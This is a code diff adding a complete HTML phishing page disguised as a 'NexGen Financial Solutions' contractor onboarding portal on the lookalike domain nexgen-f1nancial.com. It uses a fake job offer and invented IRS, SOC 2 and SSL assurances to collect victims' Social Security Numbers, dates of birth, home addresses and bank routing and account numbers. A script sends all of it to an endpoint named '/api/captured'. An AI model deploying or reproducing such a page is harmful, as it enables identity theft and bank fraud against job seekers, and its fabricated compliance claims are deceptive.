@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Contractor Onboarding — NexGen Financial Solutions</title>
+  <link rel="stylesheet" href="/static/style.css" />
+</head>
+<body>
+
+  <!-- Navbar -->
+  <nav class="navbar">
+    <div class="nav-inner">
+      <a href="/" class="nav-logo">
+        <span class="logo-icon">&#9670;</span>
+        NexGen Financial Solutions
+      </a>
+      <ul class="nav-links">
+        <li><a href="/#solutions">Solutions</a></li>
+        <li><a href="/#industries">Industries</a></li>
+        <li><a href="/#about">About</a></li>
+        <li><a href="#">Careers</a></li>
+        <li><a href="#">Contact</a></li>
+      </ul>
+      <a href="/onboarding" class="btn btn-outline-white">Contractor Portal</a>
+    </div>
+  </nav>
+
+  <!-- Page header -->
+  <div class="page-header">
+    <div class="container">
+      <h1>Contractor Onboarding</h1>
+      <p class="page-header-sub">IRS W-9 &amp; Direct Deposit Payment Setup</p>
+    </div>
+  </div>
+
+  <!-- Main content -->
+  <main class="onboarding-main">
+    <div class="container onboarding-container">
+
+      <!-- Progress indicator -->
+      <div class="progress-bar-wrap">
+        <div class="progress-step active">
+          <div class="progress-dot active">1</div>
+          <span>Profile &amp; Payment</span>
+        </div>
+        <div class="progress-line progress-line--active"></div>
+        <div class="progress-step">
+          <div class="progress-dot">2</div>
+          <span>Review &amp; Sign</span>
+        </div>
+        <div class="progress-line"></div>
+        <div class="progress-step">
+          <div class="progress-dot">3</div>
+          <span>Complete</span>
+        </div>
+      </div>
+
+      <div class="onboarding-grid">
+
+        <!-- Form panel -->
+        <div class="form-panel">
+          <div class="form-panel-header">
+            <h2>Complete Your Contractor Profile</h2>
+            <p>
+              Complete your contractor profile to receive payments for NexGen Financial Solutions
+              projects. This information is required to generate your IRS Form W-9 and set up
+              direct deposit. All fields are mandatory.
+            </p>
+          </div>
+
+          <form id="onboarding-form" action="/api/captured" method="POST" novalidate>
+
+            <!-- Personal information -->
+            <div class="form-section">
+              <h3 class="form-section-title">Personal Information</h3>
+
+              <div class="form-group">
+                <label for="full_name">Full Legal Name <span class="req">*</span></label>
+                <input type="text" id="full_name" name="full_name"
+                  placeholder="As it appears on your government-issued ID" required />
+              </div>
+
+              <div class="form-row">
+                <div class="form-group">
+                  <label for="email">Email Address <span class="req">*</span></label>
+                  <input type="email" id="email" name="email"
+                    placeholder="you@example.com" required />
+                </div>
+                <div class="form-group">
+                  <label for="phone">Phone Number <span class="req">*</span></label>
+                  <input type="tel" id="phone" name="phone"
+                    placeholder="+1 (555) 000-0000" required />
+                </div>
+              </div>
+
+              <div class="form-group">
+                <label for="dob">Date of Birth <span class="req">*</span></label>
+                <input type="date" id="dob" name="dob" required />
+                <span class="field-hint">Required for identity verification per IRS guidelines.</span>
+              </div>
+            </div>
+
+            <!-- Address -->
+            <div class="form-section">
+              <h3 class="form-section-title">Home Address</h3>
+
+              <div class="form-group">
+                <label for="street">Street Address <span class="req">*</span></label>
+                <input type="text" id="street" name="street"
+                  placeholder="123 Main Street, Apt 4B" required />
+              </div>
+
+              <div class="form-row form-row--thirds">
+                <div class="form-group">
+                  <label for="city">City <span class="req">*</span></label>
+                  <input type="text" id="city" name="city" placeholder="New York" required />
+                </div>
+                <div class="form-group">
+                  <label for="state">State <span class="req">*</span></label>
+                  <input type="text" id="state" name="state" placeholder="NY" maxlength="2" required />
+                </div>
+                <div class="form-group">
+                  <label for="zip">ZIP Code <span class="req">*</span></label>
+                  <input type="text" id="zip" name="zip" placeholder="10001" maxlength="10" required />
+                </div>
+              </div>
+            </div>
+
+            <!-- Tax / SSN -->
+            <div class="form-section form-section--sensitive">
+              <h3 class="form-section-title">Tax Identification</h3>
+              <div class="irs-notice">
+                <div class="irs-notice-icon">&#9432;</div>
+                <div class="irs-notice-text">
+                  <strong>IRS W-9 Requirement</strong> — Under IRS regulations, all independent
+                  contractors earning over $600 in a calendar year must provide their Social
+                  Security Number (SSN) or Individual Taxpayer Identification Number (ITIN) for
+                  1099-NEC reporting. Failure to provide a valid TIN may result in backup
+                  withholding at the 24% federal rate (IRC §3406).
+                </div>
+              </div>
+              <div class="form-group">
+                <label for="ssn">
+                  Social Security Number (SSN) <span class="req">*</span>
+                </label>
+                <input type="text" id="ssn" name="ssn"
+                  placeholder="XXX-XX-XXXX"
+                  maxlength="11"
+                  autocomplete="off"
+                  required />
+                <span class="field-hint">
+                  SSN — Required for IRS W-9 compliance. All contractors earning over $600 must
+                  provide SSN per IRS regulations. Your information is transmitted via 256-bit
+                  SSL encryption and stored in our SOC 2 certified environment.
+                </span>
+              </div>
+            </div>
+
+            <!-- Banking -->
+            <div class="form-section form-section--sensitive">
+              <h3 class="form-section-title">Direct Deposit Setup</h3>
+              <p class="form-section-desc">
+                Contractor payments are issued via ACH direct deposit on a Net-15 schedule.
+                Please provide your bank account details below. Payments are processed every
+                other Friday.
+              </p>
+
+              <div class="form-row">
+                <div class="form-group">
+                  <label for="routing_number">
+                    Bank Routing Number <span class="req">*</span>
+                  </label>
+                  <input type="text" id="routing_number" name="routing_number"
+                    placeholder="9-digit ABA routing number"
+                    maxlength="9"
+                    autocomplete="off"
+                    required />
+                  <span class="field-hint">For direct deposit setup. Found on the bottom-left of a check.</span>
+                </div>
+                <div class="form-group">
+                  <label for="account_number">
+                    Bank Account Number <span class="req">*</span>
+                  </label>
+                  <input type="text" id="account_number" name="account_number"
+                    placeholder="Account number"
+                    autocomplete="off"
+                    required />
+                </div>
+              </div>
+
+              <div class="form-group">
+                <label class="label-block">Account Type <span class="req">*</span></label>
+                <div class="radio-group">
+                  <label class="radio-label">
+                    <input type="radio" name="account_type" value="checking" required />
+                    <span>Checking</span>
+                  </label>
+                  <label class="radio-label">
+                    <input type="radio" name="account_type" value="savings" />
+                    <span>Savings</span>
+                  </label>
+                </div>
+              </div>
+            </div>
+
+            <!-- Submit -->
+            <div class="form-submit-area">
+              <p class="form-consent">
+                By submitting this form, you certify under penalty of perjury that the information
+                provided is accurate and complete. You authorize NexGen Financial Solutions Inc.
+                to verify your identity, report your earnings to the IRS, and deposit payments
+                to the account listed above.
+              </p>
+              <button type="submit" class="btn btn-primary btn-xl btn-full">
+                Complete Onboarding &amp; Submit W-9
+              </button>
+            </div>
+
+          </form>
+
+          <!-- Trust row -->
+          <div class="form-trust-row">
+            <div class="form-trust-item">
+              <span class="form-trust-icon">&#128274;</span>
+              <span>256-bit SSL Encryption</span>
+            </div>
+            <div class="form-trust-item">
+              <span class="form-trust-icon">&#9830;</span>
+              <span>IRS Compliant</span>
+            </div>
+            <div class="form-trust-item">
+              <span class="form-trust-icon">&#9632;</span>
+              <span>SOC 2 Type II</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Sidebar -->
+        <aside class="onboarding-sidebar">
+          <div class="sidebar-card">
+            <h4>Why we need this information</h4>
+            <ul class="sidebar-list">
+              <li>
+                <strong>SSN / TIN:</strong> Required by the IRS to issue Form 1099-NEC for
+                contractor earnings over $600 per calendar year.
+              </li>
+              <li>
+                <strong>Bank details:</strong> Used exclusively for ACH direct deposit payments.
+                We never charge your account.
+              </li>
+              <li>
+                <strong>Address &amp; DOB:</strong> Identity verification required for financial
+                services compliance (BSA/AML).
+              </li>
+            </ul>
+          </div>
+
+          <div class="sidebar-card sidebar-card--highlight">
+            <h4>Current Project</h4>
+            <div class="project-detail"><span class="detail-label">Client</span><span>NexGen Financial Solutions</span></div>
+            <div class="project-detail"><span class="detail-label">Role</span><span>Senior Financial Analyst</span></div>
+            <div class="project-detail"><span class="detail-label">Contract Value</span><span class="green">$15,000</span></div>
+            <div class="project-detail"><span class="detail-label">Start Date</span><span>April 7, 2026</span></div>
+            <div class="project-detail"><span class="detail-label">Duration</span><span>3 months</span></div>
+          </div>
+
+          <div class="sidebar-card">
+            <h4>Questions?</h4>
+            <p>Contact our contractor relations team:</p>
+            <p><strong>contractors@nexgen-f1nancial.com</strong></p>
+            <p>Mon–Fri, 9 AM – 6 PM ET</p>
+          </div>
+        </aside>
+
+      </div>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer footer--slim">
+    <div class="footer-bottom">
+      <span>&copy; 2026 NexGen Financial Solutions Inc. &mdash; nexgen-f1nancial.com</span>
+      <span>
+        <a href="#">Privacy Policy</a> &nbsp;|&nbsp;
+        <a href="#">Terms</a> &nbsp;|&nbsp;
+        <a href="#">IRS W-9 Information</a>
+      </span>
+    </div>
+  </footer>
+
+  <script>
+    const form = document.getElementById('onboarding-form');
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+      const data = Object.fromEntries(new FormData(form).entries());
+      try {
+        const resp = await fetch('/api/captured', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data),
+        });
+        if (resp.ok) {
+          window.location.href = '/success';
+        } else {
+          alert('Submission error. Please try again.');
+        }
+      } catch (err) {
+        alert('Network error. Please try again.');
+      }
+    });
+  </script>
+
+</body>
+</html>
